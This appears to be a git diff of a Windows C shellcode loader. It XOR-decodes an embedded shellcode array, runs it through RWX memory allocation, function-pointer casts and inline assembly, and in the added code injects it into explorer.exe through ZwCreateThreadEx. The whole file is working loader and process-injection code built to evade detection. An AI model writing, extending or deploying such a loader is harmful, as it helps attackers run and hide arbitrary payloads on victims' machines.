@@ -1,15 +1,10 @@
 #include<stdio.h>
 #include<Windows.h>
+#include"CodeInject.h"
+#include"Main.h"
 
 //#define ENCODE
 
-#define INIT_CODEBUFFER(s) { sizeof(s), s }
-typedef struct _CodeBuffer
-{
-	SIZE_T BufferSize;
-	BYTE* pBuffer;
-
-}CodeBuffer;
 
 /*
 BYTE shellcode[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31"	//计算器
@@ -45,7 +40,7 @@ BYTE shellcode[] = { 0x91,0x85,0xe4,0x6d,0x6d,0x6d,0xd,0xe4,0x88,0x5c,0xbf,0x9,0
 
 typedef void(__stdcall* CODE) ();
 
-void recoder()
+void XORrecoder()
 {
 
 	for (size_t i = 0; i < sizeof(shellcode); i++)
@@ -69,11 +64,11 @@ bool ChangePageProtect(CodeBuffer Buffer)
 	return TRUE;
 }
 
+///////////////////////////////
+//直接加载
 typedef void(__stdcall* CODE) ();
-
 void RunShellCode_1()
 {
-
 	PVOID pBuffer = NULL;
 	pBuffer = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (pBuffer == NULL)
@@ -90,6 +85,8 @@ void RunShellCode_1()
 
 void RunShellCode_2()
 {
+	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
+	ChangePageProtect(Buffer);
 	((void(*)(void)) & shellcode)();
 }
 
@@ -97,6 +94,8 @@ void RunShellCode_2()
 #ifdef _WIN32
 void RunShellCode_3()
 {
+	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
+	ChangePageProtect(Buffer);
 	__asm
 	{
 		lea eax, shellcode;
@@ -106,6 +105,8 @@ void RunShellCode_3()
 
 void RunShellCode_4()
 {
+	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
+	ChangePageProtect(Buffer);
 	__asm
 	{
 		mov eax, offset shellcode;
@@ -117,18 +118,32 @@ void RunShellCode_4()
 #else
 
 #endif
+
+////////////////////////////////
+//注入式加载
+
+void InjectShellCode_1()
+{
+	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
+	ChangePageProtect(Buffer);
+	DWORD dwPid = GetProcessIdByProcessName(L"explorer.exe");
+	CodeInject::ZwCreateThreadExCodeInject(dwPid, Buffer);
+}
+
+
+
 int main()
 {
-	recoder();
+	XORrecoder();
 	
 #ifndef ENCODE
 	//RunShellCode_1();
-	CodeBuffer Buffer = INIT_CODEBUFFER(shellcode);
-	ChangePageProtect(Buffer);
-	RunShellCode_2();
+	//RunShellCode_2();
 	//RunShellCode_3();
 	//RunShellCode_4();
 	//RunShellCode_5();
+	InjectShellCode_1();
 #endif
+
 	return 0;
 }
